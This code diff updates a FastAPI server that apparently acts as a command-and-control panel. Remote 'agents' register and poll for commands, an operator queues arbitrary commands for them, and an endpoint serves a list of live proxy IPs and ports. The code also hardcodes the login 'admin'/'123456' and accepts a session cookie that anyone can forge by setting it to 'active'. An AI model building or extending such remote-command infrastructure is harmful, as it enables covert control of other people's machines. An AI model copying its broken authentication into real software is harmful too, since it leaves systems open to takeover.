@@ -1,25 +1,58 @@
 from fastapi import FastAPI, Request, Form, status
-from fastapi.responses import HTMLResponse, RedirectResponse
+from fastapi.responses import HTMLResponse, RedirectResponse, JSONResponse
 from fastapi.templating import Jinja2Templates
-from typing import Dict
+from typing import Dict, List
+from datetime import datetime
 
 app = FastAPI()
 
-# إعداد القوالب
+# ======================
+# Templates
+# ======================
 templates = Jinja2Templates(directory="templates")
 
-# بيانات الدخول (غيّرها لاحقًا)
+# ======================
+# Auth Config
+# ======================
 ADMIN_USER = "admin"
 ADMIN_PASS = "123456"
 
-# تخزين مؤقت (في الإنتاج استعمل DB)
-agents: Dict[str, dict] = {}
-commands: Dict[str, str] = {}
-
-# تحقق من تسجيل الدخول
 def is_logged_in(request: Request) -> bool:
     return request.cookies.get("session") == "active"
 
+# ======================
+# In-Memory Storage
+# ======================
+agents: Dict[str, dict] = {}
+commands: Dict[str, str] = {}
+
+# مثال Proxies (لاحقًا تُربط بالـ Agents)
+proxies: List[dict] = [
+    {
+        "ip": "83.99.97.77",
+        "port": 5025,
+        "type": "HTTPS",
+        "country": "DZ",
+        "latency": "190 ms",
+        "status": "online"
+    },
+    {
+        "ip": "207.99.178.250",
+        "port": 4195,
+        "type": "HTTP",
+        "country": "DZ",
+        "latency": "45 ms",
+        "status": "online"
+    },
+    {
+        "ip": "69.171.122.204",
+        "port": 2008,
+        "type": "HTTP",
+        "country": "DZ",
+        "latency": "76 ms",
+        "status": "offline"
+    },
+]
 
 # ======================
 # Dashboard
@@ -40,9 +73,8 @@ async def dashboard(request: Request):
         }
     )
 
-
 # ======================
-# Auth
+# Login / Logout
 # ======================
 @app.post("/login")
 async def login(
@@ -63,13 +95,11 @@ async def login(
 
     return HTMLResponse("Access Denied", status_code=401)
 
-
 @app.get("/logout")
 async def logout():
     resp = RedirectResponse(url="/")
     resp.delete_cookie("session")
     return resp
-
 
 # ======================
 # Agent API
@@ -78,11 +108,16 @@ async def logout():
 async def register_agent(data: dict):
     agent_id = data.get("agent_id")
     if not agent_id:
-        return {"error": "agent_id required"}
+        return JSONResponse(
+            {"error": "agent_id required"},
+            status_code=400
+        )
 
+    data["last_seen"] = datetime.now().strftime("%H:%M:%S")
+    data["status"] = "online"
     agents[agent_id] = data
-    return {"status": "registered"}
 
+    return {"status": "registered"}
 
 @app.post("/poll")
 async def poll_agent(data: dict):
@@ -90,21 +125,12 @@ async def poll_agent(data: dict):
     if not agent_id:
         return {"error": "agent_id required"}
 
-    # تحديث آخر حالة
-    if agent_id in agents and data.get("result"):
-        agents[agent_id]["last_result"] = data["result"]
+    if agent_id in agents:
+        agents[agent_id]["last_seen"] = datetime.now().strftime("%H:%M:%S")
 
-    # إرسال أمر إن وجد
     cmd = commands.pop(agent_id, None)
-    if cmd:
-        return {"command": cmd}
+    return {"command": cmd} if cmd else {"status": "idle"}
 
-    return {"status": "idle"}
-
-
-# ======================
-# Send Command
-# ======================
 @app.post("/send_command")
 async def send_command(
     request: Request,
@@ -116,3 +142,15 @@ async def send_command(
 
     commands[agent_id] = command
     return RedirectResponse("/", status_code=303)
+
+# ======================
+# Proxies API (for UI)
+# ======================
+@app.get("/api/proxies")
+async def get_proxies():
+    return {
+        "total": len(proxies),
+        "shown": len(proxies),
+        "refresh": 5,
+        "proxies": proxies
+    }
